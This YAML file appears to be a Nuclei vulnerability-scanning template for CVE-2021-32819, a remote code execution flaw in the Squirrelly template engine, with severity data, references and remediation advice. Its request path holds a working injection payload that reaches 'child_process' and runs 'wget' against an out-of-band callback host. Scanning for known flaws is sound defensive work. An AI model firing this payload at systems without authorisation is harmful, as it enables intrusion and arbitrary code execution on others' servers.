http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    type: word
    words:
    - 'User-Agent: Wget'
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?Express=aaaa&autoEscape=&defaultFilter=e%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://{{interactsh-url}}%27);//'
id: CVE-2021-32819
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:squirrelly:squirrelly:8.0.8:*:*:*:*:*:*:*
    cve-id: CVE-2021-32819
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-200,NVD-CWE-noinfo
    epss-percentile: 0.99492
    epss-score: 0.88821
  description: 'Nodejs Squirrelly is susceptible to remote code execution. Squirrelly
    is a template engine implemented in JavaScript that works out of the box with
    ExpressJS. Squirrelly mixes pure template data with engine configuration options
    through the Express render API. By overwriting internal configuration options
    remote code execution may be triggered in downstream applications. There is currently
    no fix for these issues as of the publication of this CVE. The latest version
    of squirrelly is currently 8.0.8. For complete details refer to the referenced
    GHSL-2021-023.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  metadata:
    max-request: 1
    product: squirrelly
    vendor: squirrelly
  name: Nodejs Squirrelly - Remote Code Execution
  reference:
  - https://securitylab.github.com/advisories/GHSL-2021-023-squirrelly/
  - https://www.linuxlz.com/aqld/2331.html
  - https://blog.diefunction.io/vulnerabilities/ghsl-2021-023
  - https://nvd.nist.gov/vuln/detail/CVE-2021-32819
  - https://github.com/squirrellyjs/squirrelly/commit/c12418a026f73df645ba927fd29358efe02fed1e
  remediation: 'Update to the latest version of Nodejs Squirrelly template engine
    to mitigate the vulnerability.

    '
  severity: high
  tags: cve2021,cve,nodejs,rce,oast,squirrelly,vkev,vuln
